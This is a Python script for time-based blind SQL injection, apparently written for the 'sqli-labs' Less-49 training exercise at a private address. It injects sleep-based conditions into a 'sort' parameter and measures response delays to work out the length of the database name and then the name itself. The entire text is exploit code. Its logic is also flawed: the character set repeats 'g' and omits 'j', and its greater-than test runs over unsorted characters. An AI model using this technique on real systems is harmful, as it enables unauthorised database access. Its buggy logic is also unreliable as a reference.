import requests
import time
import string
import sys
 
headers = {"user-agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"}
 
chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
 
database = ''
 
global length

#判断数据库名的长度
for l in range(1,20):
    lengthUrl = "http://10.10.10.139/sqli-labs/Less-49?sort=1'"+'and if(length(database())>{0},1,sleep(1))'+" --+"
    lengthUrlFormat = lengthUrl.format(l)
    start_time0 = time.time()
    rsp0 = requests.get(lengthUrlFormat,headers=headers)
    if  time.time() - start_time0 > 10:
            print('database length:' + str(l))
            global length
            length = l
            break
    else:
        pass

#判断数据库名
for i in range(1,length+1):
     
    for char in chars:
        charAscii = ord(char)
         
        url = "http://10.10.10.139/sqli-labs/Less-49?sort=1'"+'and if(ascii(mid(database(),{0},1))>{1},1,sleep(1))'+" --+"
        urlformat = url.format(i,charAscii)
     
         
        start_time = time.time()
         
        rsp = requests.get(urlformat,headers=headers)
         
        if  time.time() - start_time > 10:
            database+=char
            print('database:',database)
            break
        else:
            pass
 
print('database name:' +database)